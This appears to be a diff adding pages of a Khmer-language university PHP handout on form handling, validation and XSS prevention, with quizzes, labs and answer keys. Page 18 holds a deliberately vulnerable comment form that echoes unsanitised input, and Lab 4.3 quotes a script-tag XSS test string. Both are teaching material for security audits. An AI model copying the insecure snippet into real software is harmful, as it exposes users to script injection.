+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៤ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 15: GLOSSARY & LESSON SUMMARY -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title" style="margin-top:0;"><i class="fa-solid fa-book-bookmark"></i> ៤. ពន្យល់ពាក្យ និងអក្សរកាត់គន្លឹះ (Glossary Table)</div>
+        
+        <table class="standard-table">
+            <thead>
+                <tr>
+                    <th style="width: 22%;">ពាក្យគន្លឹះ (Term)</th>
+                    <th style="width: 28%;">ឈ្មោះពេញ / ប្រភពពាក្យ</th>
+                    <th style="width: 35%;">ការពន្យល់ន័យជាភាសាខ្មែរ</th>
+                    <th style="width: 15%; text-align:center;">Bloom Level</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td><b>GET Method</b></td><td>HTTP GET Request</td><td>វិធីសាស្ត្រផ្ញើទិន្នន័យចំហរតាមរយៈ URL Query String។</td><td style="text-align:center;"><span class="bloom-tag bloom-c1">C1</span></td></tr>
+                <tr><td><b>POST Method</b></td><td>HTTP POST Request</td><td>វិធីសាស្ត្រផ្ញើទិន្នន័យលាក់ក្នុង HTTP Body សម្រាប់ទិន្នន័យសម្ងាត់។</td><td style="text-align:center;"><span class="bloom-tag bloom-c1">C1</span></td></tr>
+                <tr><td><b>Server Validation</b></td><td>Server-Side Data Checking</td><td>ការផ្ទៀងផ្ទាត់ទិន្នន័យ Form នៅលើ Server ដើម្បីទប់ស្កាត់កំហុស និង Bug។</td><td style="text-align:center;"><span class="bloom-tag bloom-c3">C3</span></td></tr>
+                <tr><td><b>Sticky Form</b></td><td>Form State Preservation</td><td>បច្ចេកទេសរក្សាទុកតម្លៃ Input ចាស់ៗពេល Form មាន Error។</td><td style="text-align:center;"><span class="bloom-tag bloom-c3">C3</span></td></tr>
+                <tr><td><b>XSS Attack</b></td><td>Cross-Site Scripting</td><td>ការវាយប្រហារលួចបញ្ចូល Script អាក្រក់តាមរយៈ Form Inputs។</td><td style="text-align:center;"><span class="bloom-tag bloom-c4">C4</span></td></tr>
+                <tr><td><b>Sanitization</b></td><td>Data Cleaning Pipeline</td><td>ការសម្អាតទិន្នន័យលុបតួអក្សរមិនល្អ មុនយកទៅប្រើប្រាស់។</td><td style="text-align:center;"><span class="bloom-tag bloom-c4">C4</span></td></tr>
+                <tr><td><b>PRG Pattern</b></td><td>Post / Redirect / Get</td><td>Design Pattern ការពារការ Submit Form ស្ទួនពេល Refresh Browser។</td><td style="text-align:center;"><span class="bloom-tag bloom-c5">C5</span></td></tr>
+            </tbody>
+        </table>
+
+        <div class="section-title" style="margin-top:12px;"><i class="fa-solid fa-list-check"></i> ៥. សង្ខេបមេរៀន (Lesson Summary)</div>
+        <div class="text-block">
+            មេរៀនទី ៤ នេះបានផ្តល់នូវចំណេះដឹងយ៉ាងជ្រាលជ្រៅក្នុងការចាត់ចែង Form Inputs និងការការពារសុវត្ថិភាព Web Application មូលដ្ឋាន៖
+        </div>
+
+        <ul class="obj-list">
+            <li><b class="highlight">១. HTTP Requests & Superglobals:</b> យល់ដឹងពីភាពខុសគ្នារវាង GET (បង្ហាញលើ URL) និង POST (លាក់ក្នុង Request Body) ព្រមទាំងការប្រមូលទិន្នន័យតាម <code>$_GET</code>, <code>$_POST</code>, និង <code>$_SERVER['REQUEST_METHOD']</code>។</li>
+            <li><b class="highlight">២. Server-Side Validation:</b> ការបង្កើនភាពជឿជាក់ទិន្នន័យតាមរយៈការ Check ទិន្នន័យទទេ <code>empty()</code>, <code>trim()</code>, ត្រួតពិនិត្យប្រវែង <code>strlen()</code>, និងទម្រង់ អ៊ីមែល <code>filter_var()</code>។</li>
+            <li><b class="highlight">៣. Sticky Controls (UX):</b> ការរក្សាតម្លៃដែល User បានវាយបញ្ចូលរួច ក្នុង <code>&lt;input value="..."&gt;</code>, Radio <code>checked</code>, Checkbox Array <code>in_array()</code>, និង Select Option <code>selected</code>។</li>
+            <li><b class="highlight">៤. Web Security & Sanitization:</b> ការប្រើប្រាស់ <code>htmlspecialchars(..., ENT_QUOTES)</code> ទប់ស្កាត់ XSS Attack, ប្រើប្រាស់ <code>filter_input()</code> សម្អាតទិន្នន័យ ព្រមទាំង PRG Pattern បញ្ចៀស Form Resubmissions។</li>
+        </ul>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៥ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 16: REVIEW QUESTIONS PART 1 -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title" style="background:var(--accent); color:white; justify-content:center; border-radius:6px; border-left:none; margin: 0; padding: 5px 0;"><i class="fa-solid fa-pen-to-square"></i> ៦. សំណួររំលឹកមេរៀន (Review Questions)</div>
+        
+        <div class="sub-heading" style="width: 100%;">៦.ក. សំណួរ ខុស/ត្រូវ (True/False - ១០ សំណួរ)</div>
+        <ol class="q-list">
+            <li>GET Method បញ្ជូនទិន្នន័យលាក់នៅក្នុង HTTP Request Body ដោយមិនបង្ហាញលើ URL ឡើយ។ <span class="bloom-tag bloom-c1">C1</span></li>
+            <li>Superglobal <code>$_POST</code> ត្រូវបានប្រើប្រាស់សម្រាប់ចាប់យកទិន្នន័យដែលបោះតាម HTTP POST Method។ <span class="bloom-tag bloom-c1">C1</span></li>
+            <li>Client-Side Validation (HTML5/JS) គឺគ្រប់គ្រាន់ហើយ មិនចាំបាច់ធ្វើ Server-Side Validation ទៀតទេ។ <span class="bloom-tag bloom-c4">C4</span></li>
+            <li>អនុគមន៍ <code>htmlspecialchars()</code> ជួយទប់ស្កាត់ការវាយប្រហារ XSS (Cross-Site Scripting)។ <span class="bloom-tag bloom-c3">C3</span></li>
+            <li>Sticky Form គឺជាបច្ចេកទេសរក្សាទុកតម្លៃ Input ចាស់ៗពេលការ Submit Form មាន Error កើតឡើង។ <span class="bloom-tag bloom-c2">C2</span></li>
+            <li>បញ្ជា <code>exit();</code> ឬ <code>die();</code> គួរតែដាក់ពីខាងក្រោយ <code>header("Location: ...");</code> ជានិច្ច។ <span class="bloom-tag bloom-c3">C3</span></li>
+            <li>អនុគមន៍ <code>filter_var($email, FILTER_VALIDATE_EMAIL)</code> ប្រគល់ <code>false</code> ប្រសិនបើទម្រង់អ៊ីមែលខុស។ <span class="bloom-tag bloom-c2">C2</span></li>
+            <li>PRG Pattern ឈរលើពាក្យពេញថា "Post / Redirect / Get"។ <span class="bloom-tag bloom-c1">C1</span></li>
+            <li><code>$_SERVER["REQUEST_METHOD"]</code> ប្រគល់តម្លៃជា "GET" ឬ "POST" អាស្រ័យលើ HTTP Request។ <span class="bloom-tag bloom-c2">C2</span></li>
+            <li>GET Method គឺស័ក្តិសមបំផុតសម្រាប់ Form ចុះឈ្មោះលេខសម្ងាត់ Password។ <span class="bloom-tag bloom-c4">C4</span></li>
+        </ol>
+
+        <div class="sub-heading" style="width: 100%; margin-top:6px;">៦.ខ. សំណួរ ពហុជ្រើសរើស (MCQs - ១០ សំណួរ)</div>
+        <ol class="q-list">
+            <li>តើ Superglobal មួយណាប្រើសម្រាប់ទាញយកទិន្នន័យបោះតាម URL Query String? <span class="bloom-tag bloom-c1">C1</span>
+                <ul class="mcq-opts"><li>A. $_POST</li><li>B. $_GET</li><li>C. $_SERVER</li><li>D. $_SESSION</li></ul>
+            </li>
+            <li>តើអនុគមន៍មួយណាប្រើសម្រាប់បំប្លែង HTML Special Characters ទៅជា HTML Entities សុវត្ថិភាព? <span class="bloom-tag bloom-c3">C3</span>
+                <ul class="mcq-opts"><li>A. trim()</li><li>B. htmlspecialchars()</li><li>C. strlen()</li><li>D. filter_var()</li></ul>
+            </li>
+            <li>តើការវាយប្រហារប្រភេទណាដែល Hacker ព្យាយាមបញ្ចូល JavaScript កូដតាម Form? <span class="bloom-tag bloom-c4">C4</span>
+                <ul class="mcq-opts"><li>A. SQL Injection</li><li>B. Cross-Site Scripting (XSS)</li><li>C. CSRF</li><li>D. DDoS</li></ul>
+            </li>
+            <li>តើគោលបំណងចម្បងនៃ PRG Pattern (Post/Redirect/Get) គឺអ្វី? <span class="bloom-tag bloom-c4">C4</span>
+                <ul class="mcq-opts"><li>A. លុប Form</li><li>B. ការពារ Form Resubmission ពេល Refresh</li><li>C. បង្កើនល្បឿន DB</li><li>D. បង្កើត Cookie</li></ul>
+            </li>
+            <li>តើអនុគមន៍មួយណាប្រើសម្រាប់លុបចន្លោះទំនេរ (Spaces) ដើម និងចុងនៃ String? <span class="bloom-tag bloom-c2">C2</span>
+                <ul class="mcq-opts"><li>A. trim()</li><li>B. strlen()</li><li>C. empty()</li><li>D. isset()</li></ul>
+            </li>
+            <li>តើ HTTP Method មួយណាដែលសមស្របបំផុតសម្រាប់ Form ស្វែងរក (Search Form)? <span class="bloom-tag bloom-c2">C2</span>
+                <ul class="mcq-opts"><li>A. POST</li><li>B. GET</li><li>C. PUT</li><li>D. DELETE</li></ul>
+            </li>
+            <li>តើអថេរ <code>$_SERVER['REQUEST_METHOD']</code> មានតួនាទីអ្វី? <span class="bloom-tag bloom-c2">C2</span>
+                <ul class="mcq-opts"><li>A. ប្រាប់ឈ្មោះ IP Address</li><li>B. ប្រាប់ប្រភេទ HTTP Request (GET/POST)</li><li>C. ប្រាប់ឈ្មោះ Browser</li><li>D. ប្រាប់ម៉ោង Server</li></ul>
+            </li>
+            <li>តើការត្រួតពិនិត្យ <code>filter_var($val, FILTER_VALIDATE_EMAIL)</code> ផ្តល់តម្លៃអ្វីបើអ៊ីមែលត្រឹមត្រូវ? <span class="bloom-tag bloom-c3">C3</span>
+                <ul class="mcq-opts"><li>A. Return false</li><li>B. Return String Email នោះ</li><li>C. Return int 1</li><li>D. Return null</li></ul>
+            </li>
+            <li>តើ Flag មួយណាដែលតម្រូវឱ្យ <code>htmlspecialchars()</code> បំប្លែងទាំង Single Quote (') និង Double Quote (")? <span class="bloom-tag bloom-c3">C3</span>
+                <ul class="mcq-opts"><li>A. ENT_NOQUOTES</li><li>B. ENT_QUOTES</li><li>C. ENT_COMPAT</li><li>D. ENT_HTML5</li></ul>
+            </li>
+            <li>តើបច្ចេកទេសអ្វីដែលរក្សាតម្លៃក្នុង Input Field ពេល Form មិនទាន់ Submit ជោគជ័យ? <span class="bloom-tag bloom-c2">C2</span>
+                <ul class="mcq-opts"><li>A. Session Form</li><li>B. Sticky Form</li><li>C. Cookie Form</li><li>D. Secure Form</li></ul>
+            </li>
+        </ol>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៦ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 17: MATCHING & EXPLANATORY QUESTIONS -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="sub-heading" style="width: 100%; margin-top:0;">៦.គ. សំណួរ ផ្គូផ្គង (Matching Questions - ១០ សំណួរ)</div>
+        <table class="matching-table">
+            <thead>
+                <tr>
+                    <th style="width:50%;">ជួរ A (PHP / Security Concept)</th>
+                    <th style="width:50%;">ជួរ B (ការពិពណ៌នា / និយមន័យ)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>១. <code>GET Method</code></td><td>A. លុបចន្លោះទំនេរដើម និងចុងនៃ String ចូល</td></tr>
+                <tr><td>២. <code>POST Method</code></td><td>B. បំលែងអក្សរពិសេសទៅជា HTML Entities ការពារ XSS</td></tr>
+                <tr><td>៣. <code>htmlspecialchars()</code></td><td>C. បញ្ជូនទិន្នន័យចំហរតាម URL Query String</td></tr>
+                <tr><td>៤. <code>trim()</code></td><td>D. បញ្ជូនទិន្នន័យលាក់ក្នុង HTTP Request Body</td></tr>
+                <tr><td>៥. <code>filter_var()</code></td><td>E. រក្សាទុកតម្លៃ Input មិនឱ្យបាត់ពេល Submit មាន Error</td></tr>
+                <tr><td>៦. <code>Sticky Form</code></td><td>F. អនុគមន៍ផ្ទៀងផ្ទាត់ទម្រង់ទិន្នន័យ (Email, URL, Int)</td></tr>
+                <tr><td>៧. <code>PRG Pattern</code></td><td>G. បញ្ជា Redirect ទៅកាន់ទំព័រផ្សេងទៀត</td></tr>
+                <tr><td>៨. <code>header("Location: ...")</code></td><td>H. ស្ថាបត្យកម្ម Post/Redirect/Get បញ្ចៀស Resubmission</td></tr>
+                <tr><td>៩. <code>XSS Attack</code></td><td>I. ការវាយប្រហារដោយ Injection JavaScript ចូលក្នុង Form</td></tr>
+                <tr><td>១០. <code>$_SERVER['REQUEST_METHOD']</code></td><td>J. ឆែកមើលប្រភេទ Request (GET ឬ POST)</td></tr>
+            </tbody>
+        </table>
+
+        <!-- SECTION 6.ឃ EXPLANATORY QUESTIONS -->
+        <div class="sub-heading" style="width: 100%; margin-top:8px; color:var(--accent);"><i class="fa-solid fa-comments"></i> ៦.ឃ. សំណួរបកស្រាយ (Explanatory Questions - ៩ សំណួរតាម ៣ កម្រិត)</div>
+        
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--success); margin:3px 0 2px 0;">[កម្រិតស្រាល - Light/Easy Level - ៣ សំណួរ]</div>
+        <ol class="q-list">
+            <li><b>Q4.1:</b> ពន្យល់ពីភាពខុសគ្នារវាង GET និង POST Methods ក្នុងការផ្ញើទិន្នន័យ Form។ <span class="bloom-tag bloom-c1">C1 - Remember</span></li>
+            <li><b>Q4.2:</b> រៀបរាប់ពីតួនាទីរបស់ Superglobals <code>$_GET</code>, <code>$_POST</code>, និង <code>$_SERVER</code> ក្នុង PHP Form Handling។ <span class="bloom-tag bloom-c2">C2 - Understand</span></li>
+            <li><b>Q4.3:</b> តើអ្វីទៅជា Sticky Form? ហេតុអ្វីបានជាវាមានសារៈសំខាន់សម្រាប់ User Experience (UX)? <span class="bloom-tag bloom-c2">C2 - Understand</span></li>
+        </ol>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--warning); margin:4px 0 2px 0;">[កម្រិតមធ្យម - Medium Level - ៣ សំណួរ]</div>
+        <ol class="q-list" start="4">
+            <li><b>Q4.4:</b> វិភាគពីហានិភ័យនៃការវាយប្រហារប្រភេទ XSS (Cross-Site Scripting) និងបកស្រាយពីរបៀបដែល <code>htmlspecialchars()</code> ទប់ស្កាត់វា។ <span class="bloom-tag bloom-c4">C4 - Analyze</span></li>
+            <li><b>Q4.5:</b> ពន្យល់ពីរបៀបរៀបចំ Server-Side Validation សម្រាប់ត្រួតពិនិត្យ (Empty, Length & Email Format)។ <span class="bloom-tag bloom-c3">C3 - Apply</span></li>
+            <li><b>Q4.6:</b> បកស្រាយពីដំណើរការនៃ PRG Pattern (Post/Redirect/Get) និងអត្ថប្រយោជន៍របស់វាក្នុង Web Applications។ <span class="bloom-tag bloom-c4">C4 - Analyze</span></li>
+        </ol>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--danger); margin:4px 0 2px 0;">[កម្រិតធ្ងន់ - Advanced/Hard Level - ៣ សំណួរ]</div>
+        <ol class="q-list" start="7">
+            <li><b>Q4.7:</b> ហេតុអ្វីបានជាយើងមិនត្រូវពឹងផ្អែកតែលើ Client-Side Validation (HTML5/JS)? ចែករំលែកសេណារីយ៉ូដែល Client-Side ត្រូវគេ Bypass។ <span class="bloom-tag bloom-c5">C5 - Evaluate</span></li>
+            <li><b>Q4.8:</b> វិភាគពីរបៀបរៀបចំ Sticky State សម្រាប់ HTML Control ស្មុគស្មាញ (Checkbox Array <code>skills[]</code> និង Radio Buttons)។ <span class="bloom-tag bloom-c4">C4 - Analyze</span></li>
+            <li><b>Q4.9:</b> ធ្វើការរចនាស៊ីជម្រៅលើ Single-File Form Processing Architecture ក្នុង PHP 8 ឱ្យមាន Security Sanitization និង Feedback Messages ត្រឹមត្រូវ។ <span class="bloom-tag bloom-c6">C6 - Create</span></li>
+        </ol>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៧ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 18: GRADED CLASSWORK & PRACTICAL LAB LISTING -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title" style="margin-top:0;"><i class="fa-solid fa-list-check"></i> ៦.ង. កិច្ចការសិក្សា និងការវាយតម្លៃ (Graded Classwork & Team Review)</div>
+        
+        <div class="sub-heading" style="margin-top:4px; color:var(--accent);"><i class="fa-solid fa-users-gear"></i> កិច្ចការក្រុម និងការវិភាគកូដ (Team Code Security Audit) <span class="bloom-tag bloom-c5">C5 - Evaluate</span> <span class="bloom-tag bloom-c6">C6 - Create</span></div>
+        
+        <div class="text-block">
+            <b>ការណែនាំ៖</b> សូមបែងចែកនិស្សិតជាក្រុម (៣-៤ នាក់) ដើម្បីសិក្សា វិភាគរកចន្លោះប្រហោងសុវត្ថិភាព (XSS Vulnerability & Missing Validation) ក្នុង Form Snippet ខាងក្រោម រួចធ្វើការ Refactor កូដឱ្យមានសុវត្ថិភាពតាមស្តង់ដារ **PHP 8 Security & Sticky Forms**៖
+        </div>
+
+        <div style="font-weight:bold; font-size:9.5pt; color:var(--danger); margin-top:4px;">• Problem Snippet (កូដមានចន្លោះប្រហោង XSS និងគ្មាន Validation)៖</div>
+        <div class="code-window">
+            <div class="code-header"><div class="code-title">vulnerable_comment_form.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-cm">// VULNERABLE CODE: Direct echo without htmlspecialchars, missing trim & empty check</span>
+<span class="cv-kw">if</span> (<span class="cv-var">$_POST</span>) {
+    <span class="cv-var">$user</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'user'</span>];
+    <span class="cv-var">$comment</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'comment'</span>];
+    <span class="cv-fn">echo</span> <span class="cv-str">"&lt;div&gt;&lt;h3&gt;Comment by "</span> . <span class="cv-var">$user</span> . <span class="cv-str">"&lt;/h3&gt;&lt;p&gt;"</span> . <span class="cv-var">$comment</span> . <span class="cv-str">"&lt;/p&gt;&lt;/div&gt;"</span>;
+}
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST"&gt;
+    User: &lt;input type="text" name="user"&gt;&lt;br&gt;
+    Comment: &lt;textarea name="comment"&gt;&lt;/textarea&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;</pre>
+        </div>
+
+        <div style="font-weight:bold; font-size:9.5pt; color:var(--success); margin-top:6px;">• ភារកិច្ចរបស់និស្សិត (Student Tasks)៖</div>
+        <ol class="q-list" style="margin-top:2px;">
+            <li><b>Task 1 (<span class="bloom-tag bloom-c4">C4</span>)៖</b> កំណត់ចំណុចខ្វះខាតសុវត្ថិភាព ២ ធំៗក្នុង Code Snippet ខាងលើ។</li>
+            <li><b>Task 2 (<span class="bloom-tag bloom-c5">C5</span>)៖</b> បញ្ចូល <code>htmlspecialchars()</code> និង <code>trim()</code> ដើម្បីទប់ស្កាត់ XSS Attack។</li>
+            <li><b>Task 3 (<span class="bloom-tag bloom-c6">C6</span>)៖</b> អនុវត្ត Sticky Form រក្សាទុកតម្លៃ <code>$user</code> និង <code>$comment</code> ពេល Submit។</li>
+        </ol>
+
+        <!-- SECTION 6.ច PRACTICAL LABS LISTING -->
+        <div class="sub-heading" style="width: 100%; margin-top:10px; color:var(--success);"><i class="fa-solid fa-laptop-code"></i> ៦.ច. បញ្ជីលំហាត់អនុវត្តន៍ (Practical Labs - ៩ លំហាត់តាម ៣ កម្រិត)</div>
+        
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--success); margin:2px 0 1px 0;">[កម្រិតស្រាល - Light/Easy Level - ៣ លំហាត់]</div>
+        <ol class="q-list">
+            <li><b>Lab 4.1:</b> បង្កើត HTML Form ស្វែងរក (Search) តាមបែប GET Method រួច echo បង្ហាញពាក្យគន្លឹះតាម <code>$_GET</code>។ <span class="bloom-tag bloom-c3">C3</span></li>
+            <li><b>Lab 4.2:</b> បង្កើត POST Form បញ្ជូនឈ្មោះ និង លេខទូរស័ព្ទ រួចប្រើ <code>$_SERVER["REQUEST_METHOD"] === "POST"</code> ត្រួតពិនិត្យ។ <span class="bloom-tag bloom-c3">C3</span></li>
+            <li><b>Lab 4.3:</b> ប្រើប្រាស់ <code>htmlspecialchars()</code> ដើម្បីបន្សាប String វាយប្រហារ <code>&lt;script&gt;alert('test')&lt;/script&gt;</code>។ <span class="bloom-tag bloom-c3">C3</span></li>
+        </ol>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--warning); margin:3px 0 1px 0;">[កម្រិតមធ្យម - Medium Level - ៣ លំហាត់]</div>
+        <ol class="q-list" start="4">
+            <li><b>Lab 4.4:</b> បង្កើត Form Validation ត្រួតពិនិត្យ ឈ្មោះ (មិនទទេ) និង អ៊ីមែល តាមរយៈ <code>filter_var()</code>។ <span class="bloom-tag bloom-c4">C4</span></li>
+            <li><b>Lab 4.5:</b> បង្កើត Sticky Text Field និង Sticky Select Dropdown រក្សាទុកជម្រើសដដែលពេលមាន Error។ <span class="bloom-tag bloom-c4">C4</span></li>
+            <li><b>Lab 4.6:</b> បង្កើត Sticky Checkbox Array <code>skills[]</code> រក្សាទុកការ Ticks ច្រើនជម្រើសតាម <code>in_array()</code>។ <span class="bloom-tag bloom-c4">C4</span></li>
+        </ol>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9.5pt; color:var(--danger); margin:3px 0 1px 0;">[កម្រិតធ្ងន់ - Advanced/Hard Level - ៣ លំហាត់]</div>
+        <ol class="q-list" start="7">
+            <li><b>Lab 4.7:</b> អនុវត្ត PRG Pattern (Post/Redirect/Get) លើ Form ដោយប្រើ <code>header("Location: ...")</code> និង <code>exit()</code>។ <span class="bloom-tag bloom-c6">C6</span></li>
+            <li><b>Lab 4.8:</b> បង្កើត User Contact Form ពេញលេញ ដែលមាន Sanitization Pipeline (<code>trim</code>, <code>filter_input</code>, <code>htmlspecialchars</code>)។ <span class="bloom-tag bloom-c6">C6</span></li>
+            <li><b>Lab 4.9:</b> អភិវឌ្ឍប្រព័ន្ធ Student Registration Single-File Application មាន Validation, Error Messages, Sticky State, និង PRG Success Alert។ <span class="bloom-tag bloom-c6">C6</span></li>
+        </ol>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៨ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 19: ANSWERS KEY PART 1 -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title" style="background:var(--success); color:white; justify-content:center; border-radius:6px; border:none; margin: 0; padding: 5px 0;"><i class="fa-solid fa-key" style="color:white; background:transparent;"></i> ៧. ចម្លើយ និងដំណោះស្រាយ (Answer Keys & Solutions)</div>
+            
+        <div class="sub-heading" style="margin-top: 6px; font-size:10pt; color:var(--success);">៧.ក. ចម្លើយ សំណួរ ខុស/ត្រូវ (True/False Answers 1-10)</div>
+        <table class="ans-table">
+            <tr><th>១</th><th>២</th><th>៣</th><th>៤</th><th>៥</th><th>៦</th><th>៧</th><th>៨</th><th>៩</th><th>១០</th></tr>
+            <tr><td>ខុស</td><td>ត្រូវ</td><td>ខុស</td><td>ត្រូវ</td><td>ត្រូវ</td><td>ត្រូវ</td><td>ត្រូវ</td><td>ត្រូវ</td><td>ត្រូវ</td><td>ខុស</td></tr>
+        </table>
+
+        <div class="sub-heading" style="margin-top: 6px; font-size:10pt; color:var(--success);">៧.ខ. ចម្លើយ សំណួរ ពហុជ្រើសរើស (MCQ Answers 1-10)</div>
+        <table class="ans-table">
+            <tr><th>១</th><th>២</th><th>៣</th><th>៤</th><th>៥</th><th>៦</th><th>៧</th><th>៨</th><th>៩</th><th>១០</th></tr>
+            <tr><td>B</td><td>B</td><td>B</td><td>B</td><td>A</td><td>B</td><td>B</td><td>B</td><td>B</td><td>B</td></tr>
+        </table>
+
+        <div class="sub-heading" style="margin-top: 6px; font-size:10pt; color:var(--success);">៧.គ. ចម្លើយ សំណួរ ផ្គូផ្គង (Matching Answers 1-10)</div>
+        <table class="ans-table" style="margin-bottom: 6px;">
+            <tr><th>១</th><th>២</th><th>៣</th><th>៤</th><th>៥</th><th>៦</th><th>៧</th><th>៨</th><th>៩</th><th>១០</th></tr>
+            <tr><td>C</td><td>D</td><td>B</td><td>A</td><td>F</td><td>E</td><td>H</td><td>G</td><td>I</td><td>J</td></tr>
+        </table>
+
+        <!-- SECTION 7.ឃ ANSWERS TO EXPLANATORY QUESTIONS -->
+        <div class="sub-heading" style="margin-top: 6px; font-size:10.5pt; color:var(--success);"><i class="fa-solid fa-comment-dots"></i> ៧.ឃ. ចម្លើយសំណួរបកស្រាយ (Answers to Explanatory Questions Q4.1 - Q4.5)</div>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9pt; color:var(--success); margin:2px 0;">[កម្រិតស្រាល - Light/Easy Level Solutions]</div>
+        <div class="explain-ans-card">
+            <h5>• ចម្លើយ Q4.1 (GET vs POST Methods)៖</h5>
+            <div class="text-block" style="font-size:9.5pt; margin:0;">
+                GET បញ្ជូនទិន្នន័យចំហរតាម URL Query String (ស័ក្តិសមសម្រាប់ Search)។ ឯ POST បញ្ជូនទិន្នន័យបង្កប់ក្នុង HTTP Request Body មិនបង្ហាញលើ URL (ស័ក្តិសមសម្រាប់ Login/Register និងទិន្នន័យសម្ងាត់)។
+            </div>
+        </div>
+
+        <div class="explain-ans-card">
+            <h5>• ចម្លើយ Q4.2 (Superglobals Role)៖</h5>
+            <div class="text-block" style="font-size:9.5pt; margin:0;">
+                • <code>$_GET</code>: ចាប់យកទិន្នន័យពី URL Query String។<br>
+                • <code>$_POST</code>: ចាប់យកទិន្នន័យពី HTTP POST Request Body។<br>
+                • <code>$_SERVER['REQUEST_METHOD']</code>: ប្រកាសប្រាប់ប្រភេទ Request Method (GET ឬ POST)។
+            </div>
+        </div>
+
